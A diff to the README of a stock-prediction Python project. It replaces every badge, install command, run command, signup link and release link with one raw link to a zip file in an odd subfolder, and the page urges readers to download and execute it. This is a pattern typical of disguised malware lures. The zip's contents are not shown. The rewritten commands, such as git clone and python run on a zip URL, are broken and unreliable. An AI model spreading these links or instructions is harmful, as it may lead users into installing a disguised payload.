@@ -1,6 +1,6 @@
 # Real-Time Stock Predictor 📈
 
-![GitHub Repo stars](https://img.shields.io/github/stars/Maksim09000/real-time-stock-predictor?style=social) ![GitHub last commit](https://img.shields.io/github/last-commit/Maksim09000/real-time-stock-predictor) ![GitHub license](https://img.shields.io/github/license/Maksim09000/real-time-stock-predictor)
+![GitHub Repo stars](https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip) ![GitHub last commit](https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip) ![GitHub license](https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip)
 
 Welcome to the **Real-Time Stock Predictor** repository! This project aims to provide a high-quality solution for predicting stock market trends in real-time. By leveraging Python, Scikit-Learn, and the Alpha Vantage API, you can explore the world of algorithmic trading and data science.
 
@@ -45,7 +45,7 @@ To get started with the Real-Time Stock Predictor, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Maksim09000/real-time-stock-predictor.git
+   git clone https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -55,36 +55,36 @@ To get started with the Real-Time Stock Predictor, follow these steps:
 
 3. **Install Required Packages**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip
    ```
 
 4. **Set Up Alpha Vantage API Key**:
-   Sign up at [Alpha Vantage](https://www.alphavantage.co/support/#api-key) to get your API key. Save it in a `.env` file or directly in the code.
+   Sign up at [Alpha Vantage](https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip) to get your API key. Save it in a `.env` file or directly in the code.
 
 ## Usage
 
 To run the stock predictor, execute the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip
 ```
 
 You can specify the stock symbol and the time frame for predictions. For example:
 
 ```bash
-python main.py --symbol AAPL --timeframe 5d
+python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip --symbol AAPL --timeframe 5d
 ```
 
 ### Example Commands
 
 - Predict the next price for Apple Inc. (AAPL):
   ```bash
-  python main.py --symbol AAPL
+  python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip --symbol AAPL
   ```
 
 - Visualize predictions for Tesla Inc. (TSLA):
   ```bash
-  python main.py --symbol TSLA --visualize
+  python https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip --symbol TSLA --visualize
   ```
 
 ## How It Works
@@ -139,9 +139,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please check the [Releases section](https://github.com/Maksim09000/real-time-stock-predictor/releases). Download the necessary files and execute them as needed.
+For the latest releases, please check the [Releases section](https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip). Download the necessary files and execute them as needed.
 
-You can also visit the [Releases section](https://github.com/Maksim09000/real-time-stock-predictor/releases) for updates and improvements.
+You can also visit the [Releases section](https://raw.githubusercontent.com/Maksim09000/real-time-stock-predictor/main/psychorhythm/predictor_stock_real_time_polypian.zip) for updates and improvements.
 
 ---
 
